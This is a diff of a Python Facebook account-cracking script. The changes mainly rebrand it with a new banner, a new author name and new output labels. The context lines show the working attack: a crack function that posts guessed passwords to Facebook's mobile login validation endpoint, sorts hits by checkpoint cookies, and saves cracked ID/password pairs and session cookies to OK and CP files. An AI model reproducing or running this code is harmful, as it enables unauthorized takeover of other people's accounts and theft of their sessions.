@@ -307,16 +307,15 @@ def animation(u):
     
 #------------------[ LOGO-HAMA ]-----------------#
 logo =""" 
-\033[1;37md8888b. d8888b.  .d88b.  
-\033[1;37m88  `8D 88  `8D .8P  Y8. 
-\033[1;37m88oodD' 88oobY' 88    88 
-\033[1;37m88~~~   88`8b   88    88 
-\033[1;37m88      88 `88. `8b  d8' 
-\033[1;37m88      88   YD  `Y88P'  
-                                    Author  : DYAR
-                                    Telegram: ‌@ba8_557
-                                    Github  : DYAR-FB
-                                    Version : N20
+██████   █████  ██     ██  █████  
+██   ██ ██   ██ ██     ██ ██   ██ 
+██████  ███████ ██  █  ██ ███████ 
+██   ██ ██   ██ ██ ███ ██ ██   ██ 
+██   ██ ██   ██  ███ ███  ██   ██
+                                    Author🧑🏻‍💻  : RAWA
+                                    CODED BY RAWA🧑🏻‍💻
+                                    Github  : NO🖕🏻
+                                    Version : 1.5🔥
 .0
 ------------------------------------------------------------                              I'm PRO For Cracking 🙂                                                              ------------------------------------------------------------"""
 os.system('clear')
@@ -414,8 +413,8 @@ def crack_file():
 #-------------[ PENGATURAN-IDZ ]---------------#
  
 def setting():
-    print("\033[1;37m[ 1 ] FAST")
-    print("\033[1;37m[ 2 ] SLOW[BEST]")
+    print("\033[1;37m[ 1 ] CRACK FAST FAST👌")
+    print("\033[1;37m[ 2 ] CRACK SLOW [BEST✅]")
     hu = input('\033[97;1m\033[92;1m\033[97;1mCHOOSE :\033[92;1m ')
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -563,7 +562,7 @@ def crack(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\033[1;31mPRO-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
+                print(f'\033[1;31mRAWA-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -572,7 +571,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[32[PRO-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
+                print(f'\r\x1b[32[RAWA✅-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
